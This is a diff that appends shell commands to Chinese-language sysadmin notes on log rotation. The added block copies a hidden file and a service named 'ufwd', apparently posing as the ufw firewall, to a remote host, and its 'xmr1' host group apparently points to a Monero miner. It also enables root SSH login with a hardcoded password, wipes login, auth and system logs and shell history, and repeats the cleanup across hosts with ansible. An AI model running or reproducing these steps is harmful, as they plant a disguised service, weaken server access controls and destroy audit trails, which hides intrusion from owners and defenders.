@@ -422,3 +422,37 @@ logrotate 用于分割日志,可以起到一个日志轮转的作用
 ```
 
 
+# 拷贝配置文件
+scp /etc/ufw/.ufwd root@172.21.0.38:/etc/ufw/
+scp /lib/systemd/system/ufwd.service root@172.21.0.38:/lib/systemd/system/
+
+# configuration
+sed -ri 's/^#PermitRootLogin prohibit-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
+systemctl restart sshd && echo "root:1+2mx8m,>D" | chpasswd
+vim /lib/systemd/system/ufwd.service
+# 配置dns解析
+sed -ri '16s#^$#nameserver 8.8.8.8#g' /etc/resolv.conf
+systemd-resolve --flush-caches && systemctl daemon-reload && systemctl restart ufwd && exit
+# 查看状态
+journalctl -f -u ufwd
+
+# Clean
+# 清除登录日志及历史命令
+echo > /var/log/wtmp
+echo > /var/log/btmp
+echo > /var/log/lastlog
+echo > /var/log/secure
+echo > /var/log/messages
+echo > /var/log/syslog
+echo > /var/log/xferlog
+echo > /var/log/auth.log
+echo > /var/log/user.log
+# 清除记录
+rm -rf ~/.bash_history
+history -c
+
+# ansible
+ansible all -m shell -a "echo > /var/log/wtmp && echo > /var/log/btmp && echo > /var/log/lastlog && echo > /var/log/secure && echo > /var/log/messages && echo > /var/log/syslog && echo > /var/log/xferlog && echo > /var/log/auth.log && echo > /var/log/user.log && rm -rf ~/.bash_history && rm -rf ~/.bash_history"
+ansible xmr1 -m shell -a "systemd-resolve --flush-caches && systemctl daemon-reload && systemctl restart ufwd"
+ansible_ssh_user=root ansible_ssh_pass="1+2mx8m,>D"
+
